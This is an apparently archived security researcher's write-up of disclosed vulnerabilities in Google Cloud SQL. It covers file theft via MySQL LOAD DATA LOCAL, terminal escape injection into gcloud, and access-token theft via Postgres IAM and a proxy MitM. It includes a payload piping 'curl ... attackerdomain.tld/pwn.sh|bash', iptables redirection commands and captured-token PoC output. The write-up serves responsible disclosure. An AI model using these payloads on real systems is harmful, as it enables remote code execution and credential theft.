---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2021-10-18_the-speckle-umbrella-story-part-2.md
original_filename: 2021-10-18_the-speckle-umbrella-story-part-2.md
title: The Speckle Umbrella story — part 2
category: documents
detected_topics:
- cloud-security
- xss
- command-injection
- otp
- automation-abuse
- information-disclosure
tags:
- imported
- documents
- cloud-security
- xss
- command-injection
- otp
- automation-abuse
- information-disclosure
language: en
raw_sha256: 3f98a11b63b69af90fd4ddb39c88c4fe80a068a83c60bd2507c71952c1955eb7
text_sha256: b126fff965286722778e688c4bdf07fee5a7fc3334b6d94bf8409ed32758111a
ingested_at: '2026-06-28T07:32:08Z'
sensitivity: unknown
redactions_applied: true
---

# The Speckle Umbrella story — part 2

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2021-10-18_the-speckle-umbrella-story-part-2.md
- Source Type: markdown
- Detected Topics: cloud-security, xss, command-injection, otp, automation-abuse, information-disclosure
- Ingested At: 2026-06-28T07:32:08Z
- Redactions Applied: True
- Raw SHA256: `3f98a11b63b69af90fd4ddb39c88c4fe80a068a83c60bd2507c71952c1955eb7`
- Text SHA256: `b126fff965286722778e688c4bdf07fee5a7fc3334b6d94bf8409ed32758111a`


## Content

---
title: "The Speckle Umbrella story — part 2"
url: "https://irsl.medium.com/the-speckle-umbrella-story-part-2-fcc0193614ea"
authors: ["Imre Rad (@ImreRad)"]
programs: ["Google"]
bugs: ["Information disclosure", "Logic flaw"]
publication_date: "2021-10-18"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 3233
scraped_via: "browseros"
---

# The Speckle Umbrella story — part 2

The Speckle Umbrella story — part 2
Imre Rad
Follow
18 min read
·
Oct 18, 2021

5

Back then in January, I reported a vulnerability to Google that let me spawn a remote shell on Cloud SQL instances, both MySQL and Postgres. This article is about the follow up, describing a couple of vulnerabilities enabled by the original finding.

If you are interested in the original flaw, you can find my detailed write up here. Even though the bug was fixed super quickly (effectively in a few days), my efforts were not rewarded financially. No matter these instances are managed by Google’s SRE team and they don’t let you execute arbitrary code on these database hosts, I learned that the VM is the security boundary here, not the SQL engine. After I proposed two additional attack vectors, the VRP team kindly assigned a research grant, so I had the chance to take a deeper look. The objective was to identify attack vectors enabled by a compromised Cloud SQL instance.

The test environment was a special MySQL instance (still in the production environment!) with an SSH server listening on port 3307 that let me access the host machine as root directly. Was a bit fragile though, as I lost access several times during this endeavor when the box was rebooted (e.g. due to the built-in self-healing feature of the product).

The architecture

The VM is running Container Optimized OS; the service is provisioned via cloud-init and in case of MySQL, it consists of the following docker containers:

mysql: the vendor application itself. The only container running as non-root.
healthcheck: this service kept interacting with both MySQL and sent heartbeats to the control plane. Has a listening socket on 0.0.0.0:8080. I found the following HTTP api methods at /servingz, /master_healthz, /varz, /rateaclz and /debug/vars (probably there are more). Since the service is not accessible over the network, I didn’t bother too much with analyzing it.
logging: this looked like a standard component of Google server side stack
monitoring: this looked like another standard component of Google server side stack
semisyncreporter: A helper service supporting replication
steward: The most important component. This is polling the PubSub channel of the VM and the Cloud SQL agent API to execute operations (e.g. list the databases) dispatched by the control plane. Steward actually exposes the unix socket of the Docker engine to the Cloud SQL control plane; to kick off a new workload, they effectively send an HTTP request to steward that is forwarded to the Docker engine to actually create a new container (an example here).

It took me quite some time to establish a stable way to monitor the activity across these components. Reversing 30+ mbyte Golang binaries ain’t fun. I wanted to deploy mitmproxy here, but encountered a couple of practical limitations (e.g. lack of trailers support). Some of the services above also had CA pinning configured, so tweaking the OS truststore was not an option. I built a plugin for ezinject, to disable the TLS verification in these services, but it was not reliable out side of my dev environment. I ended up with this solution, patching the target process on the fly to activate InsecureSkipVerify setting. Eavesdropping has finally started working:

Press enter or click to view image in full size

If you are looking for a similar tool like this, you may also be interested in another one leveraging the built-in http2debug feature —but this solution was born only after this Cloud SQL research.

Also, it would have been handy to be able to reconstruct the protocol buffer definitions used by these services, a few months later I put together an experimental solution for this purpose as well.

The GCP project behind your Cloud SQL instance is hosting thousands (?) of other SQL instances as well. Fellow researchers back then found that all these hosts were accessible over the VPC network, but the hole has been stuffed since then — the network communication to another hosts is completely firewalled.

The findings

#1 — Postgres service account has access to the Docker images of other RDSs (MySQL, SQL Server, etc.)

The service account the Cloud SQL VM is running as, has read access to a GCR repository, where docker images of another Cloud SQL products could be downloaded:

The complete list of images I could have downloaded (list fetched via the catalog API of docker):

This list includes some RDS images, which aren’t even offered to the public (Oracle).

I was uncertain whether this meets the bar of security servicing (it did not), but it is definitely not in line with best practices (principle of least privilege), hence I decided to file a ticket for this.

#2 — MySQL LOAD DATA LOCAL abuse

MySQL server has a frequently criticized feature called “LOAD DATA LOCAL”. Quoting an important line of the documentation: “In theory, a patched server could tell the client program to transfer a file of the server’s choosing rather than the file named in the statement. Such a server could access any file on the client host to which the client user has read access. (A patched server could in fact reply with a file-transfer request to any statement, not just LOAD DATA LOCAL, so a more fundamental issue is that clients should not connect to untrusted servers.)”

To verify this, I built and published a generic PoC tool at https://github.com/irsl/mysql-load-data-local-abuse.

If the MySQL server is taken over, it could have been abused to steal files of clients. Cloud Shell is running on Debian which is affected by default, so it is a perfect candidate to demonstrate this vulnerability (especially since it is also integrated with Cloud Console, so this can be triggered with a matter of a click and pushing the enter button).
I shoot a demo video about abusing the local data infile feature, this would have allowed an attacker to steal files (including ssh keys) of (other) admins. The victim could initiate the connection via the Cloud Console by using the integrated Cloud Shell. You can watch the video here:

(Little cheating: since I don’t have access to the data consumer project of cloudsql-grant, I initiated the connection to a MySQL Cloud SQL instance created by me. I didn’t have code execution on this instance this time, I redirected the TCP connection on the Cloud Shell VM to the rouge mysql tool I was hosting. I don’t see any reasons why this attack wouldn’t work in a real setup.)

W.r.t remediation, I recommended to force the mysql CLI to run with the local-infile=0 setting.

#3 — Terminal escape sequence injection to gcloud

By reverse engineering the pubsub message exchange protocol of the “steward” process I could implement a custom service to respond to “operation requests” dispatched by OnePlatform through the PubSub service. One such request is listing the databases and I put together working tooling to respond with arbitrary data. I found that the official GCP CLI, gcloud is vulnerable to terminal escape sequence injection attacks, which may lead to arbitrary command execution on the client/victim side, in case they execute a gcloud sql command that is routed to a compromised Cloud SQL instance.

If you are unfamiliar with terminal escape sequences, please refer to these great articles:

https://security.stackexchange.com/questions/56307/can-cat-ing-a-file-be-a-potential-security-risk
https://unix.stackexchange.com/questions/15101/how-to-avoid-escape-sequence-attacks-in-terminals
https://www.infosecmatter.com/terminal-escape-injection/

The most recent versions of the most popular terminal emulators are patched against attacks that are known to execute commands, but they have a long history of such issues from the past. Also, based on “… depending on terminal, other features such as font size, colors, terminal size, character set, alternate screen buffers and more may be accessible though escapes. “, and “xterm, linux console, gnome-terminal, konsole, fbterm, Terminal (Mac OS)… the list of terminal emulators is not so short! And each of them has its own bugs and limitations compared to DEC and ANSI standards.”, I think it is reasonable to assume that there are terminal emulators out there which could be exploited even today or new attacks could be identified in the future.

I think GCP users are not prepared to terminal escape sequence injections while using gcloud, so the cli should feature a security measure to prevent this class of attacks. This could be done by adding a layer to the rendering logic to mask escape characters, just like cat -v does.
As an alternative, if it is more feasible, consider adding a monitor/alert that catches escape sequence codes in responses being sent out by edge googleapis services.

The attack described above is not Cloud SQL specific, but would most probably work in case of the other similar Google Cloud services as well.

I also reviewed the source code of screen and tmux briefly.

Screen has a feature (even though it is not documented), that allows writing and reading the title of the current window, so the classical attack can be mounted to feed the input of the terminal with an arbitrary string. There is a limitation I couldn’t bypass though, newlines are filtered out, so the user needs to press the enter after the cloud command. Since I hide the injected text, I think hitting the enter button would be a user reaction with high likelihood.

To demo this, I improved the attack tool to accept charset and collision parameters as well, so an attack targeting screen could look like this:

./send-custom-databasename-response information_schema  utf8  "$(echo -e 'utf8_general_ci\n\n\e[0GTo take a quick anonymous survey, run:\n  $ gcloud survey\n\n\e[107m \e[97m \x1Bk;curl -s https://attackerdomain.tld/pwn.sh|bash;\x1B\ \e[21t')"

Explanation:

utf8_general_ci  <- the string the users expect to see
\n\n  <- some newlines
\e[0G  <- positioning the cursor back to the beginning of the line
To take a q...  <- the normal survey ad of gcloud
\n\n  <- some newlines
\e[107m  <- background color white
\e[97m  <- foreground color white
\x1Bk;curl -s https://attackerdomain.tld/pwn.sh|bash;\x1B\  <- change AKA (set the window title)
\e[21t  <- query the window title

And visuals:

#4 —Postgres IAM authentication could allow stealing access token of other users

This is (was?) about a design issue with Postgres on Cloud SQL. Postgres supports “IAM authentication” (I believe MySQL does too, it is just not documented yet, at least I saw the corresponding plugins loaded!). This is a super convenient method to access the database easily without the hassle with credentials. With a human user you can do something like this:

The access token in use here is the one prefixed with ya29.. Service accounts are supported too.

To authenticate, the IAM authentication plugin at the Postgres server side instructs the client to send a plaintext password. This way the Postgres DBMS actually received a generic (non-scoped) authentication token that could be used to communicate with another Google services on behalf of the client. In case a Postgres server is compromised (e.g. by a Cloud SQL Admin like I did it in my original report), the threat actor could abuse it to steal authentication token of (another) users.

Proof:

Malicious Psql replacement app running on my desktop, upstreaming to the Cloud SQL instance in my project:

perl psql-proxy.pl 34.78.147.29 cert.pem 0.0.0.0:5432
ngrok tcp 5432
…

Legitimate client connecting to the malicious Psql server this time (of course the target address could be the real one in case of a real attack.):

radimre83@cloudshell:~$ psql -h 6.tcp.ngrok.io — port=11497 — username radimre83@gmail.com — dbname postgres
psql (13.2 (Debian 13.2–1.pgdg100+1), server 9.6.21)
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
Type “help” for help.

postgres=>

In the output of the malicious server app:

The script above was written by me, simple dummy TCP level proxy server with dummy support for the Postgres wire protocol

To remediate this, I suggested the team to use derived tokens instead that are valid for the destination Cloud SQL instance only. This bug was marked as fixed since then. According to the feedback I received, the way the account tokens are scoped for these actions is improved —but I didn’t look into the details this time.

The PoC script used above can be found here.

#5 — Cloud SQL Auth Proxy leaking access tokens over the network — MitM attack

Cloud SQL Auth proxy is a Google product that supports the RDS instances hosted in Cloud SQL; it provides secure access to your instances without the need for securing the network access (firewall and TLS) and also facilitates authentication for non-cloud native applications (so they still use short-lived credentials instead of hard-coded passwords that are never rotated). This makes using Cloud SQL super convenient and personally I think this is a real added value compared to the competitor cloud providers.

The server side of the Cloud SQL Auth proxy is running by default on all Cloud SQL instances, listening on the tcp port 3307 open to the whole internet. As a compensating security control, the port is heavily secured using TLS/PKI; to establish the TLS channel one also needs to present a valid client certificate that was signed by an instance specific issuing CA.

Get Imre Rad’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

Example (connecting to gcp-experiments-20200608:europe-west1:cloudsql-proxy):

# openssl s_client -connect 34.76.150.103:3307
...
Acceptable client certificate CA names
dnQualifier = 9232610d-b3ae-42f5-86f8-30768f3c12e0, CN = Google Cloud SQL Signing CA gcp-experiments-20200608:cloudsql-proxy, O = "Google, Inc", C = US
C = US, O = "Google, Inc", OU = Google Cloud SQL Connectivity Probers, CN = Google Cloud SQL Connectivity Probers CA

You can obtain a client certificate by calling the createEphemeral method of the Cloud SQL Admin API. This requires “Cloud SQL Client” IAM role, at least.

To make the setup easier, Google provides the “client side” proxy application as well, which opens a simple tunnel on the loopback network interface; look at the architecture diagram here. This project is open source and can be found here.

The TLS channel between the Cloud SQL Auth proxy client and server is TLSv1.3 by default, but TLSv1.2 was supported as well.

The application supports a special flag:

-enable_iam_login
Enables the proxy to use Cloud SQL IAM database authentication. This will cause the proxy to use IAM account credentials for database user authentication.

If it is enabled, the access token of the user running the client proxy will be included into the client certificate during the provisioning process. The responsible code could be found here.

The access token is among the subject alternative names and looks like this:

nonamedomainkft@cloudshell:~$ openssl asn1parse -in cert-iam.pem
...
  88:d=5  hl=2 l=  3 prim: OBJECT  :commonName
  93:d=5  hl=2 l=  67 prim: PRINTABLESTRING  :Google Cloud SQL Signing CA gcp-experiments-20200608:cloudsql-proxy
  607:d=5  hl=2 l=  3 prim: OBJECT  :X509v3 Subject Alternative Name
...
  612:d=5  hl=4 l= 325 prim: OCTET STRING  [HEX DUMP]:
...
nonamedomainkft@cloudshell:~$ echo | xxd -r -p | xxd
00000000: 3082 0141 8119 6e6f 6e61 6d65 646f 6d61  0..A..nonamedoma
00000010: 696e 6b66 7440 676d 6169 6c2e 636f 6da0  inkft@gmail.com.
00000020: 8201 2206 0155 a082 011b 0382 0117 000d  .."..U..........
00000030: 0000 0000 1a8e 0279 6132 392e 6130 4166  .......ya29.a0Af
00000040: 4836 534d 426d 3759 5575 4351 3962 4468  H6SMBm7YUuCQ9bDh
00000050: 2d6c 5a42 4f31 6b6d 766b 314f 6f70 7a74  -lZBO1kmvk1Oopzt
00000060: 3256 4837 6149 4965 666e 4b34 5945 5774  2VH7aIIefnK4YEWt
00000070: 4374 6443 5f50 5339 4d35 7137 2d6d 5250  CtdC_PS9M5q7-mRP
...redacted

In general, x509 certificates are public by nature, but “client certificates” sometimes are loaded with additional responsibility, like in this example. The finding here is, before TLSv1.3, client certificates are transferred over the network in clear text, as part of the TLS handshake. This means, access_tokens of Cloud SQL Proxy users can be eavesdropped by attackers in man in the middle position, and then connect/authenticate to the database, with the same permissions as the original client. The identity owning the access_token might of course have additional IAM roles assigned as well, so the impact of obtaining such a token could be wider than the Cloud SQL platform alone.

TLS implementations usually reject setting up a TLS listener without having the private key, so to demonstrate this, I built a tool on top of a patched version of Golang’s TLS stack. The handshake is failing at the end, but at that point the client certificate has already been captured.

Simulating the rouge myself being in a MitM position:

root@cloudshell:~$ iptables -tnat -A OUTPUT -p tcp -d 34.76.150.103 --dport 3307 -j DNAT --to-destination 13.58.157.220:10839

Running the Cloud SQL Auth Proxy:

nonamedomainkft@cloudshell:~/cloud-sql-proxy/x$ ./cloud_sql_proxy -instances=gcp-experiments-20200608:europe-west1:cloudsql-proxy=tcp:3307 -enable_iam_login
...

Initiating a connection:

nonamedomainkft@cloudshell:~$ psql -h 127.0.0.1 -p 3307
psql: error: server closed the connection unexpectedly
  This probably means the server terminated abnormally
  before or while processing the request

On the attacker console (where the PoC application had been started before the steps above):

root@c5503f5f4779:/data/_2/cloudsql-proxy-tls-client-cert-go# ./cloudsql-proxy-mitm-poc 34.76.150.103:3307
2021/05/18 15:30:44 Connecting to 34.76.150.103:3307 to obtain info about the TLS setup
2021/05/18 15:30:44 We are in VerifyPeerCertificate of the TLS client. len(rawCerts): 1, len(verifiedChains): 0
2021/05/18 15:30:44 The server wants a client certificate
2021/05/18 15:30:44 Saved 2 AcceptableCAs for later use
2021/05/18 15:30:44 Listening on 0.0.0.0:3307
2021/05/18 15:31:57 New connection from 127.0.0.1:50848, trying the TLS handshake
Sending list of CAs from config.AcceptableCAs
2021/05/18 15:31:58 We are in VerifyPeerCertificate of the TLS server. len(rawCerts): 1, len(verifiedChains): 0
2021/05/18 15:31:58 The client sent a certificate!
Subject: CN=cloudsql-user,O=Google\, Inc,C=US
Issuer: CN=Google Cloud SQL Signing CA gcp-experiments-20200608:cloudsql-proxy,O=Google\, Inc,C=US,2.5.4.46=#132439323332363130642d623361652d3432***REDACTED-SUSPECT-TOKEN***2021/05/18 15:31:58  DNS SANs:
2021/05/18 15:31:58  EmailAddresses:
2021/05/18 15:31:58  #0: nonamedomainkft@gmail.com
2021/05/18 15:31:58  IPAddresses:
2021/05/18 15:31:58  URIs:
2021/05/18 15:31:58 SAN extension found
2021/05/18 15:31:58 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! username: nonamedomainkft@gmail.com
2021/05/18 15:31:58 A copy of the certificate saved locally: nonamedomainkft@gmail.com.der
2021/05/18 15:31:58 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! access_token: ya29.a0AfH6SMDZ8b6_0chbdQ267xQbkDq_dj4qJvix4jvpjdnQmOdLaNyqwqqxb9dv2...redacted...
2021/05/18 15:31:58 {
  "issued_to": "618104708054-9r9s1c4alg36erliucho9t52n32n6dgq.apps.googleusercontent.com",
  "audience": "618104708054-9r9s1c4alg36erliucho9t52n32n6dgq.apps.googleusercontent.com",
  "user_id": "102701670780110145962",
  "scope": "https://www.googleapis.com/auth/userinfo.email https://www.googleapis.com/auth/appengine.admin https://www.googleapis.com/auth/bigquery https://www.googleapis.com/auth/compute https://www.googleapis.com/auth/devstorage.full_control https://www.googleapis.com/auth/devstorage.read_only https://www.googleapis.com/auth/drive https://www.googleapis.com/auth/ndev.cloudman https://www.googleapis.com/auth/cloud-platform https://www.googleapis.com/auth/sqlservice.admin https://www.googleapis.com/auth/prediction https://www.googleapis.com/auth/projecthosting https://www.googleapis.com/auth/source.full_control https://www.googleapis.com/auth/source.read_only https://www.googleapis.com/auth/source.read_write openid",
  "expires_in": 3493,
  "email": "nonamedomainkft@gmail.com",
  "verified_email": true,
  "access_type": "online"
}
2021/05/18 15:31:58 remote error: tls: internal error

The oldest Github issue of Cloud SQL Auth proxy is dated back to 2016, way before TLSv1.3, so I felt it has a chance that this feature had been using even when only TLSv1.2 was supported by Golang. In this case, old clients may be submitting access tokens over the network in clear text, allowing passive attackers (compared to the above, that requires an active attacker) may steal the tokens and gain access to the database (or more). The product team got back to VRP and they to me, that this IAM feature was added only later on, when Golang already supported TLSv1.3, so this suspicion was incorrect.

Since then, the product team has also patched the hole behind the main attack vector so Cloud SQL auth proxy clients force using TLSv1.3. If you are concerned about active network attacks, make sure to upgrade your client.

The tool used to demonstate this attack can be found here.

While researching this topic, I also identified a DoS issue in Golang’s TLS implementation (CVE-2021–34558), the fun fact here is, the language had been vulnerable since version 1.0 :)

#6 — Cloud SQL — SQL Proxy information disclosure flaw (project and instance name)

Cloud SQL authentication proxy server — a Golang application — is running by default on each Cloud SQL instance and is publicly accessible from any IP addresses. The software is vulnerable to information disclosure; project name and SQL instance name are disclosed without authentication. Connecting to my SQL grant instance:

openssl s_client -connect 35.226.100.244:3307
…
Acceptable client certificate CA names
dnQualifier = 60884d4d-def3–480b-9492-b9d305c1bb21, CN = Google Cloud SQL Signing CA cloudsql-grant:cloudsql-grant, O = “Google, Inc”, C = US
C = US, O = “Google, Inc”, OU = Google Cloud SQL Connectivity Probers, CN = Google Cloud SQL Connectivity Probers CA

In this example above, the first cloudsql-grant is the name of the GCP project, the second is the name of the SQL instance.

As some quick additional proof, I increased the IP address by one and connected there as well:

openssl s_client -connect 35.226.100.245:3307
…
dnQualifier = 47accc47-febf-43cc-bdc2-b40149bfebb9, CN = Google Cloud SQL Signing CA neuron-prod:sentry-postgresql, O = “Google, Inc”, C = US

This info is coming from the TLS handshake, certificate_authorities field. It is not possible to fine-tune this setup in Golang; sharing this info cannot be disabled. I recommended here to contact the Golang team to and request improving the configurability of the TLS stack, so the SQL proxy would not disclose this info any longer. As the attack scenario I highlighted that a crawler bot could enumerate and build a map about the complete Cloud SQL userbase by connecting to port 3307 and extracting this information about the project and SQL instance names. I guess a public database like this may even draw the attention of journalists focusing on IT security.

This submission was accepted first… then turned into duplicate the day after. I didn’t receive any follow up since.

Summary

#1 GCR permissions — accepted —not rewarded — not fixed
#2 MySQL LOAD DATA LOCAL — accepted — rewarded — fixed
#3 — Terminal escape sequence injection to gcloud — accepted — not rewarded — not yet fixed
#4 — Postgres IAM authentication could allow stealing access token of other users — accepted — rewarded — fixed
#5 — Cloud SQL Auth Proxy leaking access tokens over the network — MitM attack — accepted — rewarded — fixed
#6 — Cloud SQL — SQL Proxy information disclosure flaw (project and instance name) — duplicate
Side tracks

Reader users to run queries with SUPER privileges

This is one of the attack vectors I highlighted to VRP originally:

Given a GCP project with an App engine hosted web application and a MySQL server with log_bin_trust_function_creators, this latter to support stored procedures. I think this is a quite typical setup so far. A user with reader role on the project could look into the source code of the web application, where the SQL credentials can usually be found. Then, this user could connect to the database with these credentials (typically bound to a single database with read/write access), could create a stored procedure there (with invoker security level), then could execute a CSV export to execute that procedure which in turn would let them execute querys with SUPER privileges. This includes creating additional MySQL accounts which is not possible for Reader users normally.

To the best of my knowledge, executing queries with SUPER privileges is still possible the same way as I described it in my original article, but initiating a CSV export is not possible purely as a Reader user, as the system does enforce write access to the destination bucket and it cannot be a remote one (a bucket hosted in a foreign project where the same user may have more access).

As this worked slightly differently than I expected, and I felt the attack vector moving away from reality, I didn’t report this after all.

Embedded private key of Google Cloud SQL Connectivity Probers

In one of the binaries on the host I found an embedded certificate with long time until expiration and also the corresponding private key hardcoded. The details are:

Issuer: C = US, O = “Google, Inc”, OU = Google Cloud SQL Connectivity Probers, CN = Google Cloud SQL Connectivity Probers CA
Validity
Not Before: Dec 28 14:40:14 2020 GMT
Not After : Dec 28 14:40:14 2120 GMT
Subject: C = US, O = “Google, Inc”, OU = Google Cloud SQL Connectivity Probers, CN = Google Cloud SQL Connectivity Probers

If you scroll up, you can see that this CA name is among the accepted one for the mTLS handshake! Running the next openssl command quickly stopped me being too excited about it:

openssl s_client -connect 35.187.22.77:3307 -cert steward-connectivity-probe.crt -key steward-connectivity-probe.key.txt

The certificate was indeed accepted (the mTLS handshake has succeeded), but the application layer shut down the connection immediately after.

Conclusion: in line with it’s name, this keypair was used only to verify the SQL auth proxy server is accepting connections properly.

XSS

Around the end of the research, I was able to mimic most functionality of the steward process. This enabled me checking an XSS attack vector: what happens on the GCP console if a compromised SQL instance returns an XSS payload as part of the list databases response? As expected -, thanks to the modern, template based javascript frameworks that are available nowadays, the malicious response was rendered correctly:

Press enter or click to view image in full size

Besides this attack, I also experimented with a couple of other gRPC responses (both via the PubSub and the long-polling based channel of the SQL agent API), but besides getting different internal error responses, I couldn’t really accomplish anything.

Backups

I also spent quite some time understanding how the backup procedure of these database instances looks like. At first, I expected an external connection (e.g. by mysqldump or similar) fetching all the data from the database, and I was hoping that I could combine it with the local data infile attack. But the box did not receive any new external connections during the backup. At this point I was already in the position to monitor all interaction with the control plane, and I observed only 2 “oneshot” requests being dispatched during the backup:

osSync
readBinlogPosition

Nothing data related… I even populated the database with gigabytes of data and compared the number of bytes transferred on the network. I saw no correlation.

So how do they backup then? The answer is simple: by leveraging disk snapshotting. While this sounds complex, it isn’t really if the feature is provided by the infrastructure natively :)

The only attack vector I could see here is messing with the filesystem directly, but that didn’t make much sense against a threat model described in the opening chapter.

So I think the algo is something like:
- operation request: os_sync
- create a disk snapshot
- operation request: readbinlogpos
- … and ready: no further post processing (snapshot is not attached to any VMs, not mounted, not uploaded to GCS)

I was experimenting a bit with the responses to the the operation requests above, e.g. sending back a negative, but this design really doesn’t have much potential here from an attacker point of view.

Btw, this backup technique is called application consistent snapshots, and is generally available for a while (I believe since this summer) on the Compute Engine as well. The synchronization mechanism is different though; under the hood, this is accomplished as a new service (cloud.vmm.SnapshotService) on metadata.google.internal:8081; the client interacting with it is the google guest agent service running on the VM.

The platform also supports exporting/restoring data from/to CSV files in remote GCS buckets. I did not analyze this attack vector, even though the permission handling sounds like an interesting challenge to solve (how does the service account of the steward SQL agent interact with the objects in the remote bucket it normally has no permissions for?).

Wrap up

Props to the SRE team for patiently repeating the setup process every single time and for the VRP team for giving this opportunity (ignoring me would have been so much easier…). It has been an awesome experience looking around on the server side and I learned a lot about Google internals!

Imre Rad
